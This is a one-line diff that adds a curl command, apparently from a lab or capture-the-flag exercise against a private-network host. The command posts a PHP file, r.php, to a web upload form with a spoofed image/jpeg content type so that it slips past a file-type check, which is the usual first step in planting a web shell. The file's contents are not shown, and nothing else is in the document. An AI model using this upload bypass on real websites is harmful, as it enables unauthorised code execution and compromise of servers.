@@ -1,0 +1,1 @@
+curl -F "uploaded=@r.php;type=image/jpeg" -F "Upload=Upload" 'http://10.11.249.37/?page=upload#'
